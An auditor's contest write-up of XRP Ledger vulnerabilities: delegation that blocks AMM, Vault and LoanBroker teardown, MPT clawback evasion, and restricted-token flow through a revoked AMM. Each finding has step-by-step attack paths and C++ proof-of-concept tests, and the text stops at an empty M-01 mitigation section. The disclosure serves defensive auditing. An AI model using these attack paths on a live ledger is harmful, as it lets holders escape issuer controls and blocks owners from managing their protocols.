# XRP Ledger Contest
XRP Ledger || AMM, MPT, Vaults, Lending, Delegation, Sponsorship || Apr 2026 on [Sherlock](https://audits.sherlock.xyz/contests/1260)

**Platform:** Sherlock · **Repo:** [sherlock-audit/2026-04-xrp-ledger-april-2026](https://github.com/sherlock-audit/2026-04-xrp-ledger-april-2026) · **Rank: 6th** · [Demonhatz](https://audits.sherlock.xyz/watson/Demonhatz)

My Finding Summay
|ID|Title|Severity|
|:-:|:---|:------:|
|[H-01](#h-01-an-attacker-will-block-amm-vault-or-loanbroker-teardown-and-force-repeated-deletion-failures-for-protocol-owners)|An attacker will block AMM, Vault, or LoanBroker teardown and force repeated deletion failures for protocol owners|HIGH|
|[H-02](#h-02-mpt-clawback-from-amm-permanently-blockable-via-mptoken-deletion--single-asset-xrp-withdrawal)|MPT Clawback from AMM Permanently Blockable via MPToken Deletion + Single-Asset XRP Withdrawal|HIGH|
||||
|[M-01](#m-01-an-unauthorized-payer-will-deliver-restricted-mpts-to-unauthorized-recipients-through-an-amm-after-issuer-revocation)|An unauthorized payer will deliver restricted MPTs to unauthorized recipients through an AMM after issuer revocation|MEDIUM|
|[M-02](#m-02-an-attacker-will-create-unbacked-ledger-objects-and-impose-irreversible-reserve-deficits-on-the-protocol)|An attacker will create unbacked ledger objects and impose irreversible reserve deficits on the protocol|MEDIUM|
|[M-03](#m-03-vault-sponsor-reserve-permanently-locked--sponsorshiptransfer-is-silently-blocked-by-validvault-invariant-on-every-vault-sle)|Vault sponsor reserve permanently locked — SponsorshipTransfer is silently blocked by ValidVault invariant on every vault SLE|MEDIUM|

---

## [H-01] An attacker will block AMM, Vault, or LoanBroker teardown and force repeated deletion failures for protocol owners

### Summary
Allowing `DelegateSet` to authorize pseudo-accounts without validation will cause persistent teardown denial of service for protocol owners as an attacker will create a delegation entry targeting an AMM, Vault, or LoanBroker pseudo-account that prevents deletion operations until the attacker revokes the delegation.

### Root Cause
In `DelegateSet::preclaim()` the protocol validates only that the authorized account exists and does not verify whether the account is a pseudo-account.

The authorization logic performs only an existence check: [`DelegateSet.cpp` L43–L45](https://github.com/sherlock-audit/2026-04-xrp-ledger-april-2026/blob/main/rippled/src/libxrpl/tx/transactors/delegate/DelegateSet.cpp#L43-L45)

```cpp
if (!ctx.view.exists(keylet::account(ctx.tx[sfAuthorize])))
    return tecNO_TARGET;
```

No validation is performed to reject pseudo-accounts.

After passing preclaim validation, `DelegateSet::doApply()` inserts the delegate object into the authorized account owner directory:

```cpp
auto const destPage = ctx_.view().dirInsert(
    keylet::ownerDir(authAccount), delegateKey, describeOwnerDir(authAccount));

if (!destPage)
    return tecDIR_FULL;
```

This insertion occurs even when the authorized account is a pseudo-account such as an AMM, Vault, or LoanBroker.

The deletion logic for these components later scans the owner directory and fails when unexpected ledger objects are present.

The choice to allow delegation to pseudo-accounts is a design mistake because pseudo-accounts represent system-managed entities whose lifecycle depends on predictable owner directory contents.

### Internal Pre-conditions
1. An AMM, Vault, or LoanBroker instance needs to exist on the ledger.
2. The attacker needs to control a funded account capable of submitting `DelegateSet`.
3. The pseudo-account must have an owner directory.
4. The legitimate owner must attempt to delete or tear down the AMM, Vault, or LoanBroker.

### External Pre-conditions
1. The network must support delegation functionality.
2. The pseudo-account must remain active until deletion is attempted.

### Attack Path
1. The attacker identifies the pseudo-account address of an AMM, Vault, or LoanBroker.
2. The attacker submits a `DelegateSet` transaction authorizing the pseudo-account.
3. The protocol inserts an `ltDELEGATE` object into the pseudo-account owner directory.
4. The legitimate owner attempts to delete or tear down the AMM, Vault, or LoanBroker.
5. The deletion logic scans the owner directory and detects the unexpected delegation object.
6. The deletion operation fails with an internal error or obligation failure.
7. The attacker leaves the delegation entry in place.
8. All subsequent deletion attempts continue to fail.
9. The system remains undeletable until the attacker voluntarily revokes the delegation.

### Impact
The protocol owner cannot delete or shut down the affected AMM, Vault, or LoanBroker while the attacker-controlled delegation exists.

This creates a persistent teardown denial of service because deletion logic repeatedly fails even though the legitimate owner satisfies all normal teardown conditions.

The attacker retains full control over the blocking state because the delegation object is owned by the attacker account.

The legitimate owner cannot remove the blocking entry because they do not control the delegator account.

As a result, the system lifecycle becomes attacker-dependent.

Operational consequences include:

- The protocol owner cannot decommission or upgrade the affected component
- The system remains stuck in an undeletable state
- Administrative recovery depends entirely on attacker cooperation

This establishes a persistent denial of service against core protocol lifecycle operations.

### PoC

```cpp
void
testPseudoAccountAuthorizeDoS()
{
    testcase("delegate to pseudo-account blocks teardown");
    using namespace jtx;

    auto hasKey = [](xrpl::Dir const& dir, uint256 const& key) {
        return std::find_if(dir.begin(), dir.end(), [&](auto const& sle) {
                   return sle->key() == key;
               }) != dir.end();
    };

    {
        Env env(*this, testable_amendments());
        Account const gw{"gateway"};
        Account const owner{"owner"};
        Account const attacker{"attacker"};
        auto const USD = gw["USD"];

        env.fund(XRP(100000), gw, owner, attacker);
        env.close();
        env(trust(owner, USD(100000)));
        env(pay(gw, owner, USD(10000)));
        env.close();

        AMM amm(env, owner, XRP(1000), USD(1000));
        for (auto i = 0; i < maxDeletableAMMTrustLines + 10; ++i)
        {
            Account const holder{std::to_string(i)};
            env.fund(XRP(1000), holder);
            env(trust(holder, STAmount{amm.lptIssue(), 1000}));
            env.close();
        }
        amm.withdrawAll(owner);
        BEAST_EXPECT(amm.ammExists());
        Account const ammPseudo{"amm", amm.ammAccount()};
        env.memoize(ammPseudo);

        env(delegate::set(attacker, ammPseudo, {"Payment"}));
        env.close();

        auto const delegateKey = keylet::delegate(attacker.id(), amm.ammAccount());
        BEAST_EXPECT(env.closed()->exists(delegateKey));
        BEAST_EXPECT(
            hasKey(xrpl::Dir(*env.closed(), keylet::ownerDir(amm.ammAccount())), delegateKey.key));

        amm.ammDelete(owner, ter(tecINTERNAL));
        BEAST_EXPECT(amm.ammExists());
        amm.ammDelete(owner, ter(tecINTERNAL));
        BEAST_EXPECT(amm.ammExists());

        env(delegate::set(attacker, ammPseudo, {}));
        env.close();

        amm.ammDelete(owner);
        BEAST_EXPECT(!amm.ammExists());
    }

    {
        Env env(*this, testable_amendments() | featureSingleAssetVault);
        Account const owner{"owner"};
        Account const attacker{"attacker"};
        PrettyAsset const asset{xrpIssue(), 1'000'000};
        Vault const vault{env};

        env.fund(XRP(100000), owner, attacker);
        env.close();

        auto const [tx, vaultKeylet] = vault.create({.owner = owner, .asset = asset});
        env(tx);
        env.close();

        auto const vaultSle = env.le(vaultKeylet);
        BEAST_EXPECT(vaultSle != nullptr);
        if (!vaultSle)
            return;

        Account const vaultPseudo{"vault", vaultSle->at(sfAccount)};
        env.memoize(vaultPseudo);

        env(delegate::set(attacker, vaultPseudo, {"Payment"}));
        env.close();

        auto const delegateKey = keylet::delegate(attacker.id(), vaultPseudo.id());
        BEAST_EXPECT(env.closed()->exists(delegateKey));
        BEAST_EXPECT(
            hasKey(xrpl::Dir(*env.closed(), keylet::ownerDir(vaultPseudo.id())), delegateKey.key));

        env(vault.del({.owner = owner, .id = vaultKeylet.key}), ter(tecHAS_OBLIGATIONS));
        env.close();
        env(vault.del({.owner = owner, .id = vaultKeylet.key}), ter(tecHAS_OBLIGATIONS));
        env.close();

        env(delegate::set(attacker, vaultPseudo, {}));
        env.close();

        env(vault.del({.owner = owner, .id = vaultKeylet.key}));
        env.close();
        BEAST_EXPECT(!env.le(vaultKeylet));
    }

    {
        FeatureBitset const features =
            testable_amendments() | featureMPTokensV1 | featureSingleAssetVault |
            featureLendingProtocol;
        Env env(*this, features);
        Account const owner{"owner"};
        Account const attacker{"attacker"};
        PrettyAsset const asset{xrpIssue(), 1'000'000};
        Vault const vault{env};

        env.fund(XRP(100000), owner, attacker);
        env.close();

        auto const [tx, vaultKeylet] = vault.create({.owner = owner, .asset = asset});
        env(tx);
        env.close();

        auto const brokerKeylet = keylet::loanbroker(owner.id(), env.seq(owner));
        env(loanBroker::set(owner.id(), vaultKeylet.key));
        env.close();

        auto const brokerSle = env.le(brokerKeylet);
        BEAST_EXPECT(brokerSle != nullptr);
        if (!brokerSle)
            return;

        Account const brokerPseudo{"broker", brokerSle->at(sfAccount)};
        env.memoize(brokerPseudo);

        env(delegate::set(attacker, brokerPseudo, {"Payment"}));
        env.close();

        auto const delegateKey = keylet::delegate(attacker.id(), brokerPseudo.id());
        BEAST_EXPECT(env.closed()->exists(delegateKey));
        BEAST_EXPECT(
            hasKey(xrpl::Dir(*env.closed(), keylet::ownerDir(brokerPseudo.id())), delegateKey.key));

        env(loanBroker::del(owner.id(), brokerKeylet.key), ter(tecHAS_OBLIGATIONS));
        env.close();
        env(loanBroker::del(owner.id(), brokerKeylet.key), ter(tecHAS_OBLIGATIONS));
        env.close();

        env(delegate::set(attacker, brokerPseudo, {}));
        env.close();

        env(loanBroker::del(owner.id(), brokerKeylet.key), ter(tesSUCCESS));
        env.close();
        BEAST_EXPECT(!env.le(brokerKeylet));
    }
}
```

This PoC demonstrates:

- The attacker can delegate to a pseudo-account
- The delegate object is inserted into the pseudo-account owner directory
- Deletion attempts repeatedly fail while the delegation exists
- Revoking the delegation restores deletion functionality

This confirms the attacker-controlled teardown denial of service condition.

### Mitigation
Reject pseudo-accounts during delegation authorization.

Add validation in `DelegateSet::preclaim()` to prevent delegation to system-managed accounts.

```cpp
auto const sleAuthorize =
    ctx.view.read(
        keylet::account(
            ctx.tx[sfAuthorize]));

if (!sleAuthorize)
    return tecNO_TARGET;

if (isPseudoAccount(sleAuthorize))
    return tecNO_PERMISSION;
```

This ensures delegation can only target user-controlled accounts and prevents attacker-controlled objects from being inserted into pseudo-account owner directories.

---

## [H-02] MPT Clawback from AMM Permanently Blockable via MPToken Deletion + Single-Asset XRP Withdrawal

### Summary
The failure to consider AMM liquidity provider exposure during `MPTokenAuthorize` deletion will cause a permanent loss of issuer clawback capability for regulated token positions as an authorized holder will delete their MPToken, block issuer-initiated clawback through a forced authorization failure, and then extract the full economic value of their AMM position using a single-asset withdrawal path that bypasses authorization checks.

The vulnerability arises from the interaction of three independent logic paths that individually enforce valid constraints but collectively create a deterministic escape condition. Once the holder removes their MPToken, the issuer's `AMMClawback` operation aborts due to authorization enforcement in the `createMPToken` routine, while the holder retains unrestricted access to the XRP withdrawal path that does not require the missing authorization object. The result is a permanent protocol-level failure of the `lsfMPTCanClawback` guarantee under normal system operation.

### Root Cause
In [`MPTokenAuthorize.cpp`](https://github.com/sherlock-audit/2026-04-xrp-ledger-april-2026/blob/main/rippled/src/libxrpl/tx/transactors/token/MPTokenAuthorize.cpp#L51) within the preclaim validation logic, the system permits deletion of a holder’s MPToken as long as the holder’s on-account balance and locked balance are both zero. The implementation does not evaluate whether the holder maintains indirect economic exposure to the token through AMM liquidity provider tokens.

```cpp
// MPTokenAuthorize.cpp, lines 51-98

if ((ctx.tx.getFlags() & tfMPTUnauthorize) != 0u)
{
    if (!sleMpt)
        return tecOBJECT_NOT_FOUND;

    if ((*sleMpt)[sfMPTAmount] != 0)
        return tecHAS_OBLIGATIONS;

    if ((*sleMpt)[~sfLockedAmount].value_or(0) != 0)
        return tecHAS_OBLIGATIONS;

    return tesSUCCESS;     // No validation of AMM LP exposure
}
```

This logic assumes that zero on-account balance implies zero token exposure. That assumption is incorrect once assets are deposited into an AMM, because the assets are transferred to the AMM pseudo-account while the holder retains proportional ownership through LP tokens.

A second failure occurs in the `createMPToken` routine inside `AMMWithdraw.cpp`, where authorization is always enforced regardless of the calling context. Even when `AMMClawback` invokes withdrawal using `AuthHandling::ahIGNORE_AUTH`, the internal authorization logic still executes.

```cpp
// AMMWithdraw.cpp, lines 640-656

auto createMPToken = [&](Asset const& asset) -> TER {
    if (mptokenKey && account != asset.getIssuer())
    {
        auto const& mptIssue = asset.get<MPTIssue>();
        if (auto const err = requireAuth(view, mptIssue, account, AuthType::WeakAuth);
            !isTesSuccess(err))
            return err;

        if (auto const err = checkCreateMPT(view, mptIssue, account, sponsor, journal);
            !isTesSuccess(err))
            return err;
    }
    return tesSUCCESS;
};
```

When the MPToken has been deleted and the issuance requires authorization, the following enforcement guarantees failure:

```cpp
// MPTokenHelpers.cpp, lines 391–393

if (sleIssuance->isFlag(lsfMPTRequireAuth) &&
    (!sleToken || !sleToken->isFlag(lsfMPTAuthorized)))
    return tecNO_AUTH;
```

The third failure occurs in `AMMWithdraw.cpp`, where the preclaim validation mask excludes `tfOneAssetWithdrawAll`. As a result, single-asset withdrawals skip validation of the paired asset and do not instantiate the missing MPToken.

```cpp
// AMMWithdraw.cpp, lines 271-277

if ((ctx.tx.getFlags() & (tfLPToken | tfWithdrawAll)) != 0u)
{
    if (auto const ter = checkAmount(amountBalance, amountBalance))
        return ter;

    if (auto const ter = checkAmount(amount2Balance, amount2Balance))
        return ter;
}
```

Because `tfOneAssetWithdrawAll` is not included in this mask, the system allows withdrawal of the unrestricted asset without consulting authorization state for the restricted token.

The combination of these three behaviors creates a deterministic and permanent clawback bypass condition.

### Internal Pre-conditions
1. The issuer needs to create an MPT issuance with `lsfMPTRequireAuth` set to true
2. The issuer needs to create an MPT issuance with `lsfMPTCanClawback` set to true
3. The holder needs to be authorized to hold the MPT
4. The holder needs to deposit their entire MPT balance into an AMM pool
5. The holder's `MPTAmount` on their account needs to be exactly 0
6. The holder needs to hold a positive balance of AMM LP tokens representing their pooled position

### External Pre-conditions
1. The AMM pool needs to contain XRP or another unrestricted asset paired with the MPT
2. The network needs to process standard ledger transactions under normal protocol rules
3. No administrative privilege escalation or governance manipulation is required

### Attack Path
1. The holder deposits their full MPT balance into the AMM pool using `AMMDeposit`, transferring custody of the MPT to the AMM pseudo-account while receiving LP tokens.
2. The holder calls `MPTokenAuthorize` with flag `tfMPTUnauthorize`, deleting their MPToken because their on-account balance and locked amount are both zero.
3. The issuer attempts to claw back the holder’s AMM position using `AMMClawback`.
4. The `AMMClawback` transaction internally invokes `AMMWithdraw`, which attempts to create a destination MPToken.
5. The authorization check fails because the holder’s MPToken has been deleted, causing the clawback transaction to return `tecNO_AUTH`.
6. The holder executes `AMMWithdraw` using flag `tfOneAssetWithdrawAll` targeting XRP.
7. The withdrawal path bypasses authorization validation and successfully transfers the full XRP value of the holder’s LP position.
8. The holder’s LP balance becomes zero, permanently preventing future clawback attempts.

Consider the following scenario:

A borrower receives a regulated loan denominated in MPT that supports both `lsfMPTRequireAuth` and `lsfMPTCanClawback`.

The borrower obtains 120,000 MPT, representing approximately $120,000 in loan value.

The borrower deposits the entire balance into an MPT/XRP AMM and receives LP tokens.

After the deposit, the borrower’s direct wallet balance becomes zero because the MPT is now held by the AMM pseudo-account.

The borrower deletes their MPToken entry using `tfMPTUnauthorize`.

Later, the borrower stops repayment and the loan enters default through the lending system.

The lender attempts to recover the regulated exposure using `AMMClawback`.

The clawback fails with `tecNO_AUTH` because the borrower’s MPToken entry no longer exists.

The borrower then performs a single-asset withdrawal into XRP and exits the pool.

Due to normal AMM slippage and fees, the borrower receives approximately $114,000 in liquid XRP.

At that point:

- The borrower has fully exited the AMM
- The borrower no longer holds LP tokens
- Future clawback attempts fail with `tecAMM_BALANCE`

The regulated asset value that should have remained recoverable is permanently lost.

Value that can no longer be clawed back: 120,000 MPT worth approximately $120,000.

Who suffers the loss: the lender, vault, or risk-bearing side absorbs the unrecoverable exposure.

Who benefits: the borrower exits with approximately $114,000 in liquid value after AMM costs.

### Impact
The issuer permanently loses the ability to enforce the `lsfMPTCanClawback` guarantee for the affected position.

The holder converts their regulated token exposure into an unrestricted asset beyond issuer control. The issuer suffers a complete loss of clawback capability for the affected liquidity position, and the protocol's regulatory enforcement mechanism becomes ineffective for that holder.

The attack does not require privileged roles, does not rely on protocol misconfiguration, and executes entirely under valid transaction rules. The failure directly breaks a core security property of permissioned token issuance.

The impact is persistent and irreversible once the holder withdraws their LP position.

### PoC
The PoC is integrated into the protocol's own test suite at `rippled/src/test/app/AMMClawbackMPT_test.cpp` and runs as `xrpl.app.AMMClawbackMPT` test case `"Clawback bypass: MPToken deletion + single-asset XRP withdraw"`. It uses the real `AMMCreate` / `AMMDeposit` / `AMMWithdraw` / `AMMClawback` / `MPTokenAuthorize` transactors with no mocks.

```cpp
void
testClawbackBypassViaMPTokenDeletion(FeatureBitset features)
{
    testcase("Clawback bypass: MPToken deletion + single-asset XRP withdraw");
    using namespace jtx;

    Env env(*this, features);
    Account const gw{"gateway"};
    Account const alice{"alice"};   // attacker / sanctioned holder
    Account const carol{"carol"};   // co-LP keeps the pool multi-LP so
                                    // single-asset withdraw is allowed
    env.fund(XRP(100'000), gw, alice, carol);
    env.close();

    // Realistic permissioned/regulated MPT issuance: clawback enabled
    // AND require-auth set. This is precisely the configuration the
    // attack defeats. Pay equals deposit amount so that alice's
    // on-account MPTAmount becomes exactly 0 after she enters the pool
    // (a pre-condition for the MPTokenAuthorize/tfMPTUnauthorize step).
    MPTTester BTC(
        {.env = env,
         .issuer = gw,
         .holders = {alice, carol},
         .pay = 500,
         .flags = tfMPTCanClawback | tfMPTRequireAuth | MPTDEXFlags,
         .authHolder = true});

    auto const mptID = BTC.issuanceID();
    BEAST_EXPECT(env.le(keylet::mptoken(mptID, alice)) != nullptr);
    BEAST_EXPECT(env.le(keylet::mptoken(mptID, carol)) != nullptr);

    // Carol seeds the AMM with the rest of her BTC. She becomes the
    // permanent counter-LP, which keeps the pool multi-LP so that
    // alice's later single-asset extraction does not violate the
    // "one-side empty" invariant.
    AMM amm(env, carol, BTC(500), XRP(500));
    Account const ammAcct{"amm", amm.ammAccount()};
    BEAST_EXPECT(BTC.checkFlags(lsfMPTAMM | lsfMPTAuthorized, ammAcct));

    // Alice deposits her ENTIRE BTC balance plus equal XRP. After this
    // her on-account MPTAmount is zero (all her BTC sits in the AMM
    // pseudo-account) and she holds ~50% of the LP supply.
    amm.deposit(alice, BTC(500), XRP(500));
    env.close();
    auto const aliceLPTokensBefore = amm.getLPTokensBalance(alice);
    BEAST_EXPECT(aliceLPTokensBefore > IOUAmount{0});
    BEAST_EXPECT(env.balance(alice, BTC) == BTC(0));
    BEAST_EXPECT(env.balance(ammAcct, BTC) == BTC(1'000));

    // (A) Holder deletes her MPToken with tfMPTUnauthorize. Allowed
    // because MPTAmount==0 and LockedAmount==0; LP exposure is NOT
    // examined.
    BTC.authorize({.account = alice, .flags = tfMPTUnauthorize});
    env.close();
    BEAST_EXPECT(env.le(keylet::mptoken(mptID, alice)) == nullptr);
    BEAST_EXPECT(amm.getLPTokensBalance(alice) == aliceLPTokensBefore);

    // (B) Issuer attempts AMMClawback against alice. The internal
    // withdraw -> createMPToken(BTC) -> requireAuth(WeakAuth) chain
    // returns tecNO_AUTH because alice's MPToken is gone.
    auto const aliceXrpBeforeClawback = env.balance(alice);
    env(amm::ammClawback(gw, alice, BTC, XRP, std::nullopt),
        ter(tecNO_AUTH));
    env.close();
    BEAST_EXPECT(amm.getLPTokensBalance(alice) == aliceLPTokensBefore);

    // Same result with explicit clawback amount (the same withdraw
    // path is taken via equalWithdrawMatchingOneAmount).
    env(amm::ammClawback(gw, alice, BTC, XRP, BTC(500)), ter(tecNO_AUTH));
    env.close();
    BEAST_EXPECT(amm.getLPTokensBalance(alice) == aliceLPTokensBefore);

    // Pool is untouched, alice still holds her LP tokens.
    BEAST_EXPECT(env.balance(ammAcct, BTC) == BTC(1'000));
    // Issuer paid only fees on the failed clawback (alice is unaffected).
    BEAST_EXPECT(env.balance(alice) == aliceXrpBeforeClawback);

    // (C) Alice extracts her LP value via single-asset XRP withdrawal.
    // tfOneAssetWithdrawAll bypasses the preclaim re-check of both
    // assets, and the XRP-only path never instantiates the MPT side
    // (no createMPToken call), so the missing MPToken does not block
    // the withdrawal.
    auto const aliceXrpBeforeExtract = env.balance(alice);
    amm.withdraw(
        alice,
        std::nullopt,            // no LP-token amount: uses all
        XRP(0),                  // min XRP out = 0 (accept AMM math)
        std::nullopt,
        std::nullopt,
        tfOneAssetWithdrawAll,
        std::nullopt,
        std::nullopt,
        ter(tesSUCCESS));
    env.close();

    // Alice burnt all her LP tokens and received XRP for them.
    BEAST_EXPECT(amm.getLPTokensBalance(alice) == IOUAmount{0});
    BEAST_EXPECT(env.balance(alice) > aliceXrpBeforeExtract);
    // The MPT side of the pool is untouched: alice took only XRP.
    BEAST_EXPECT(env.balance(ammAcct, BTC) == BTC(1'000));

    // (D) Issuer's clawback against alice now fails with tecAMM_BALANCE
    // because alice has no LP tokens left - the escape is permanent.
    env(amm::ammClawback(gw, alice, BTC, XRP, std::nullopt),
        ter(tecAMM_BALANCE));
    env.close();

    // Final invariant: alice's MPT exposure has been converted to XRP
    // beyond the issuer's reach, while the protocol's lsfMPTCanClawback
    // guarantee was nominally in force the whole time.
    BEAST_EXPECT(env.le(keylet::mptoken(mptID, alice)) == nullptr);
    BEAST_EXPECT(amm.getLPTokensBalance(alice) == IOUAmount{0});
    BEAST_EXPECT(env.balance(ammAcct, BTC) == BTC(1'000));
}
```

How to run:

```
cd rippled/.build
cmake --build . -j4 --target xrpld
./xrpld --unittest=xrpl.app.AMMClawbackMPT \
        --unittest-arg="Clawback bypass: MPToken deletion + single-asset XRP withdraw"
```

### Mitigation
The protocol must prevent deletion of an MPToken while the holder maintains active liquidity provider exposure to any AMM containing that token.

The `MPTokenAuthorize::preclaim` routine should iterate through the holder’s owner directory and detect any LP token trustline referencing an AMM pool that contains the target MPT issuance. If such exposure exists, the deletion request must return `tecHAS_OBLIGATIONS`.

Implementing this validation restores the invariant that token authorization cannot be removed while indirect economic exposure remains active and preserves the enforceability of the issuer’s clawback rights.

---

## [M-01] An unauthorized payer will deliver restricted MPTs to unauthorized recipients through an AMM after issuer revocation

### Summary
The missing per-account authorization check on the AMM as the synthetic offer owner for the output MPT asset will cause restricted MPT distribution to unauthorized recipients as an unauthorized payer will route a payment through the AMM book and receive successful delivery of an MPT whose AMM authorization has already been revoked by the issuer.

The issue exists because the AMM offer path treats the AMM as funded without consulting authorization state, `BookStep::checkMPTDEX` enforces only issuance-level transferability on the output side, and `directSendNoFeeMPT` explicitly assumes authorization was checked earlier. As a result, once an issuer revokes the AMM pseudo-account’s `lsfMPTAuthorized` flag, the path engine still treats the AMM as a valid source of MPT liquidity and continues dispensing the restricted token to unrelated accounts. This breaks the core `tfMPTRequireAuth` invariant for any MPT inventory held inside an AMM.

### Root Cause
In the AMM offer path, [`AMMOffer.h`](https://github.com/sherlock-audit/2026-04-xrp-ledger-april-2026/blob/main/rippled/include/xrpl/tx/paths/AMMOffer.h#L114) returns true unconditionally. This is a mistake because it causes the path engine to treat the synthetic AMM offer as available liquidity without validating whether the AMM pseudo-account is still authorized to hold and transfer the MPT.

```cpp
isFunded() const { return true; }
```

In `BookStep::checkMPTDEX`, the output-side MPT validation only checks issuance-level transferability through `canTransfer`. It does not check whether the offer owner, which is the AMM pseudo-account, still satisfies `requireAuth` for the output MPT.

```cpp
if (book_.out.holds<MPTIssue>())
{
    auto const& asset = book_.out;
    if (strandDeliver_ == asset && strandDst_ == asset.getIssuer())
        return true;
    if (asset.getIssuer() == owner)
        return true;
    return isTesSuccess(canTransfer(view, asset, owner, owner));
}
```

This is a mistake because `canTransfer` validates issuance-level transfer permissions such as `lsfMPTCanTransfer`, but it does not validate whether the AMM account itself is still authorized under `tfMPTRequireAuth`.

The final component of the bug is that `directSendNoFeeMPT` explicitly skips authorization checks and relies on the caller to have already enforced them.

```cpp
directSendNoFeeMPT(...)
{
    // Do not check MPT authorization here - it must have been checked earlier
    ...
}
```

Since the earlier path logic never checks `requireAuth(view, asset, owner)` for the AMM as the output-side owner, nothing in the swap path ever asks whether the AMM is still allowed to hold and distribute the MPT after revocation.

The asymmetry with the freeze path confirms the defect. The AMM accounting layer already filters frozen AMM MPT balances:

```cpp
[&](MPTIssue const& issue) {
    if (auto const sle = view.read(keylet::mptoken(issue, ammAccountID));
        sle && !isFrozen(view, ammAccountID, issue))
        return STAmount{issue, (*sle)[sfMPTAmount]};
    return STAmount{asset};
}
```

There is no equivalent `requireAuth` filter here. That is why freeze is enforced while revoked authorization is bypassed.

### Internal Pre-conditions
1. The issuer needs to create an MPT issuance with `tfMPTRequireAuth` enabled.
2. A holder authorized by the issuer needs to seed an AMM pool containing the MPT.
3. `AMMCreate` needs to authorize the AMM pseudo-account for the MPT so the pool can initially hold the token.
4. The issuer needs to revoke the AMM pseudo-account’s authorization by clearing `lsfMPTAuthorized` through `MPTokenAuthorize` with `tfMPTUnauthorize`.
5. The AMM needs to retain MPT inventory after the revocation.

### External Pre-conditions
1. An external payer needs to submit a payment routed through the AMM path using `~MPT(asset)`.
2. The payer and recipient do not need to be authorized holders of the MPT.
3. The ledger needs to process the payment under normal pathing and AMM execution rules.

### Attack Path
1. The issuer creates an MPT with `tfMPTRequireAuth`, so every holder must be explicitly authorized.
2. An authorized holder seeds an AMM with XRP and the MPT, causing the AMM pseudo-account to hold MPT inventory.
3. The issuer revokes the AMM pseudo-account’s authorization for the MPT.
4. An unrelated payer submits a payment pathing through `~MPT(asset)` against the AMM book.
5. The path engine evaluates the synthetic AMM offer and treats it as funded because `AMMOffer::isFunded()` always returns true.
6. `BookStep::checkMPTDEX` checks only issuance-level transferability for the output side and never checks whether the AMM pseudo-account is still authorized to hold and distribute the MPT.
7. `directSendNoFeeMPT` executes transfer settlement without performing any additional authorization validation.
8. The recipient receives the restricted MPT from the AMM even though the issuer has already revoked the AMM’s authorization.

### Impact
The issuer’s `tfMPTRequireAuth` policy is violated because the AMM continues to move restricted token value after its authorization has been explicitly revoked.

The protocol correctly prevents transfers to unauthorized recipients. However, once the issuer revokes the AMM pseudo-account’s authorization, the AMM must no longer participate in transfers involving the restricted token under any circumstance.

Instead, the AMM continues to act as an active liquidity source and can transfer restricted value to authorized recipients even though it is no longer authorized to hold or distribute that asset.

This breaks the fundamental authorization invariant of permissioned MPT issuance:

An account that is not authorized to hold a restricted token must not be able to move that token.

The affected party is the issuer and the policy domain governing restricted asset distribution. The protocol does not allow the issuer to reliably halt movement of restricted liquidity once it resides inside an AMM pool.

This creates a direct policy enforcement failure because revocation does not immediately stop value movement from the revoked account.

The failure is deterministic and persists until the AMM inventory is manually removed or the pool is dismantled.

This establishes a compliance and control violation where revocation does not terminate operational access to restricted value.

Example scenario:

Consider a permissioned token issued under `tfMPTRequireAuth`.

An authorized user creates an AMM pool and deposits:

- 100 USD worth of restricted MPT
- 100 XRP

At creation time, the AMM pseudo-account is automatically authorized because the creator was authorized.

Later, the issuer revokes the AMM’s authorization.

At this moment, the expected invariant is:

The AMM must not be able to send or move the restricted token.

However, the AMM still holds 100 USD of restricted value.

A user then submits a swap routed through the AMM.

The AMM sends the full 100 USD of restricted MPT to another authorized account.

The transfer succeeds.

The restricted value has been moved by an account that is no longer authorized to hold or distribute the asset.

This demonstrates the real violation:

Authorization revocation does not stop value movement.

### PoC

```cpp
#include <test/jtx.h>
#include <test/jtx/AMM.h>
#include <test/jtx/AMMTest.h>

#include <xrpl/protocol/Feature.h>
#include <xrpl/protocol/LedgerFormats.h>
#include <xrpl/protocol/TxFlags.h>

namespace xrpl {
namespace test {

struct AMMRevokedAuth_test : public jtx::AMMTest
{
    void
    testRevokedAMMAuthStillTrades()
    {
        testcase("Revoked AMM auth still trades");

        using namespace jtx;

        Env env{*this};
        env.fund(XRP(400'000), gw, alice, bob, carol);
        env.close();

        // MPT requires explicit issuer authorization for every holder.
        auto ETH = MPTTester(
            {.env = env,
             .issuer = gw,
             .holders = {bob, carol},
             .pay = 150'000,
             .flags = tfMPTRequireAuth | MPTDEXFlags,
             .authHolder = true});

        // Bob seeds a legitimate AMM pool. AMMCreate implicitly authorizes
        // the AMM pseudo-account for the MPT (lsfMPTAuthorized).
        AMM const ammBob(env, bob, XRP(100), MPT(ETH)(150'000));
        Account const ammAcct("amm", ammBob.ammAccount());

        BEAST_EXPECT(ETH.checkFlags(lsfMPTAMM | lsfMPTAuthorized, ammAcct));

        // Issuer REVOKES the AMM's authorization. The AMM should no longer
        // be able to act as a counterparty for this MPT under requireAuth.
        ETH.authorize({.account = gw, .holder = ammAcct, .flags = tfMPTUnauthorize});
        env.close();
        BEAST_EXPECT(ETH.checkFlags(lsfMPTAMM, ammAcct)); // lsfMPTAuthorized cleared

        // Alice (no MPT, no auth) pays XRP through ~MPT(ETH).
        // Carol receives 50,000 ETH delivered out of the unauthorized AMM.
        env(pay(alice, carol, MPT(ETH)(50'000)),
            path(~MPT(ETH)),
            sendmax(XRP(50)),
            txflags(tfPartialPayment));
        env.close();

        // Bug confirmed: payment succeeded; AMM dispensed restricted MPTs
        // despite its authorization having been revoked by the issuer.
        BEAST_EXPECT(env.balance(carol, MPT(ETH)) == MPT(ETH)(200'000));
        BEAST_EXPECT(ammBob.expectBalances(
            XRP(150), MPT(ETH)(100'000), ammBob.tokens()));
    }

    void
    run() override
    {
        testRevokedAMMAuthStillTrades();
    }
};

BEAST_DEFINE_TESTSUITE(AMMRevokedAuth, app, xrpl);

}  // namespace test
}  // namespace xrpl
```

This PoC proves the bug directly.

The test first confirms that the AMM pseudo-account initially holds both `lsfMPTAMM` and `lsfMPTAuthorized`.

It then revokes the AMM’s authorization and confirms that `lsfMPTAuthorized` has been cleared.

After that, an unrelated payer routes XRP through `~MPT(ETH)`, and the payment succeeds.

The recipient’s MPT balance increases by 50,000 ETH, proving that restricted MPT inventory was dispensed out of the AMM after authorization had already been revoked.

The AMM balances also update exactly as a successful swap, confirming that this is not a test artifact or partial-failure path. The production routing engine fully executes the unauthorized trade.

Setup: create a new file at `rippled/src/test/app/AMMRevokedAuth_test.cpp`, then run:

```
cmake --build rippled/.build/build/build/Debug --target xrpld -j4
rippled/.build/build/build/Debug/xrpld --unittest=AMMRevokedAuth
```

### Mitigation
